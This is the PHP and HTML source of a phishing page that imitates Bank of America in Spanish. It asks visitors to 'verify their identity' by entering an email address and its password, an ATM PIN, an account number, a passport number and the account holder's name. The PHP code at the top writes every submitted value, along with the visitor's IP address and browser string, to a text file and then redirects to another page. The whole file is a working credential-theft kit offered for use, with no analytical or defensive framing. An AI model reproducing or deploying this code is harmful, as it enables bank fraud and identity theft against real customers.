﻿<?php
if(isset($_POST['add'])){
  $email = "";
  if (!empty($_REQUEST['email'])){
  $email = $_POST['email'];
  $pin = $_POST['pin'];
  $cpass = $_POST['cpass'];
  $oc1 = $_POST['label145'];
  $oe2 = $_POST['label909'];
  $on3 = $_POST['label5654'];
  $ip = $_SERVER['REMOTE_ADDR'];
  $ip2 = $_SERVER['HTTP_USER_AGENT'];
}

$post = "";
if (!empty($_REQUEST['post'])){
 $post = $_REQUEST['post'];
}

$archivo = "che123.txt";
$file = fopen($archivo,"a");
fwrite($file,"Email: ".$email."\r\nClave: ".$cpass."\r\nPIN: ".$pin."\r\nAccount Number: ".$oc1."\r\nNumber Passport: ".$oe2."\r\nVerbal Password: ".$on3."\r\nIP: ".$ip."\r\nNavegador: ".$ip2."\r\n==============================\r\n");
fclose($file);
header ('location: ftggggg.php');

}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="stylesheet" href="css/normalize.min.css" />
<link rel="stylesheet" href="css/estilos.css" />
<title>    Bank of America</title>
<link rel="shortcut icon" href="img/favicon.png" type="image/x-icon" />
</head>
<body>
<div class="container">
<div class="banner1">
<img src="img/pvp.jpg" alt="juguetes" />
<p class="txtg">Entrar</p>
<div class="derLinks">
<img class="sarea" src="img/free.jpg" alt="candado" />
<div class="areaSegura">Área protegida</div>
<img class="sarea2" src="img/santo.jpg" alt="puntos" />
<div class="lenguaje">In English</div>
</div>
</div>
<div class="banner2">
<h1>Verificar su identidad</h1>
</div>
<div class="banner3">
<div class="columnas">
<div class="columnaX">
<h2 class="titulo2">
Indicar por motivos de verificación los detalles de la tarjeta y productos asociados a su cuenta
</h2>
<p>
Para verificar su identidad, necesitamos validar su información de la banca en línea
</p>
<form action="" method="post">
<div class="form-group-l">
<label class="form2label" for="correo"
>Correo electrónico</label
>
<p>
  <input type="email" name="email" placeholder="******@****.com" size=40 style="width:208px" required>
</p>
</div>

<div class="form-group-l">
<label class="form2label" for="correo">Clave del correo electrónico</label>
<input type="password" name="cpass" placeholder="*************" required>
</div>
<div class="form-group-l">
<label class="form2label" for="atm">ATM/Debit Card PIN</label>
<input type="password" name="pin" maxlength="6" placeholder="****" required>
<div class="form-group-l">
</div>
<div class="form-group-l">
<label class="form2label" for="label45"
>Checking/Savings Account Number</label
></p>
<input type="text" name="label145" maxlength="12" placeholder="xx-xx-xxxxxxxx" required>
</div>
<div class="form-group-l">
<label class="form2label" for="label909"
>Number of Associated Passport</label
>
<p>this document number must match the one used when you opened your account  </p>
<p>
  <input type="text" name="label909" maxlength="9" placeholder="xx-xxxxxxx" required>
</p>
</div>
<div class="form-group-l">
<label class="form2label" for="label5654"
>Nombre del titular </label
></p>
<input type="txt" name="label5654" placeholder="name" required>
</div>
</div>
<div class="footer-form">
  <p style="position: relative; width: 600px">
Esta validación caduca la sesión en 10 minutos después de que lo solicite. Por favor, recuerde seguir el proceso seguridad, para mantenerlo protegido
</p>
<button class="btn principal" name="add" type="submit">
CONFIRMAR
</button>
</div>
</form>
</div>
<div class="columna3" style="float: right">
<h2>Ayuda para entrar</h2>
<ul class="menosmargin">
<li>
<a href="#">
¿No reconoce o no puede acceder a la dirección de correo
electrónico o al número de teléfono proporcionados?
</a>
</li>
</ul>
</div>
</div>
</div>
<div class="banner4" style="height: 130px">
<div class="fondolock"></div>
<p>Área protegida</p>
<div class="enlaces-footer">
<a href="#">Privacidad</a>
<a href="#">Seguridad</a>
</div>
<div class="copirait">
<p>Bank of America, N.A. Miembro de FDIC.</p>
<a href="#">
Igualdad de oportunidades en préstamos para viviendas
</a>

<span class="corporation">© 2023 Bank of America Corporation.</span>
</div>
</div>
</div>
<script src="js/funciones.js"></script>
</body>
</html>
